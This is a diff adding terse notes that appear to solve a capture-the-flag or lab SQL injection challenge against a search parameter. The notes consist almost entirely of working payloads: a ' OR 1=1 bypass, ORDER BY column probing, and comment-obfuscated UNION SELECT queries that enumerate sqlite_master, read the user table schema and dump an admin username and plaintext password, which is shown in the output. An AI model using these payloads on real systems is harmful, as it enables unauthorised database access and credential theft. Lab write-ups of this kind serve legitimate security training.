@@ -1,0 +1,24 @@
+' OR 1=1--
+classic%' ORDER BY 5--
+
+/?search=%'/*union*/UNION/*select*/SELECT+1,name,3,4,5+FROM+sqlite_master+WHERE+type%3d'table'--
+### Get Table ###
+product
+user
+
+/?search=%'/*union*/UNION/*select*/SELECT+1,sql,3,4,5+FROM+sqlite_master+WHERE+type%3d'table'--
+### Get Table Column ###
+
+CREATE TABLE user (
+	id INTEGER NOT NULL, 
+	username VARCHAR(40), 
+	password VARCHAR(40), 
+	PRIMARY KEY (id), 
+	UNIQUE (username)
+)
+
+/?search=%'/*union*/UNION/*select*/SELECT+1,id,username,password,5+FROM+user--
+
+id: 1
+username: admin
+password: NT7b#ed4$J?eZ#m_
